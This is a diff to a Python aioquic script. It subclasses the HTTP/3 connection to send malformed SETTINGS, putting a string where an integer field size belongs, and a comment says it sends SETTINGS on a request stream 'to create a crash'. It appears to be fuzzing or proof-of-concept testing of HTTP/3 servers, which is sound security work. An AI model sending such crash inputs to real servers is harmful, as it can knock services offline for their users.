@@ -1,8 +1,33 @@
 import aioquic
-from aioquic.h3.connection import H3Connection, HeadersState, FrameUnexpected, encode_frame, FrameType, encode_settings
+from aioquic.h3.connection import (
+    H3Connection, 
+    HeadersState, 
+    FrameUnexpected, 
+    encode_frame, 
+    FrameType, 
+    encode_settings,
+    Setting
+)
 from aioquic.h3.events import Headers
 
 
+class H3ConnectionChild(H3Connection):
+
+    def _get_local_settings(self) -> dict:
+        """
+        Return the local HTTP/3 settings.
+        """
+        settings = {
+            Setting.QPACK_MAX_TABLE_CAPACITY: self._max_table_capacity,
+            Setting.QPACK_BLOCKED_STREAMS: self._blocked_streams,
+            Setting.ENABLE_CONNECT_PROTOCOL: 1,
+            Setting.DUMMY: 1,
+            Setting.MAX_FIELD_SECTION_SIZE: "Let me create a Crash please"
+        }
+        if self._enable_webtransport:
+            settings[Setting.H3_DATAGRAM] = 1
+            settings[Setting.ENABLE_WEBTRANSPORT] = 1
+        return settings
 
 # Sending SETTINGS Frame on Request Stream to create a crash
 def send_headers(
@@ -53,3 +78,5 @@ def send_headers(
     conn._quic.send_stream_data(
         stream_id, encode_frame(FrameType.HEADERS, frame_data), end_stream
     )
+
+
